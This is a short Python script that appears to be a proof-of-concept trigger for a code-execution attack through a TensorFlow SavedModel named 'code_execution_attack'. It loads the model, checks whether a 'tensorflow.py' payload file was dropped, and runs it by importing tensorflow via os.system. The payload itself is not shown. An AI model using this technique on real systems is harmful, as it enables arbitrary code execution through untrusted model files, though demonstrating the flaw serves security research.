import tensorflow as tf
import os
import sys

loaded_model = tf.saved_model.load("code_execution_attack")
result = loaded_model(tf.constant(10.0))
print(f"Model Inference Result: {result.numpy()}")

if os.path.exists("tensorflow.py"):
	print("Payload file detected")
	os.system(f"{sys.executable} -c 'import tensorflow'")
else:
	print("Payload file was not created")
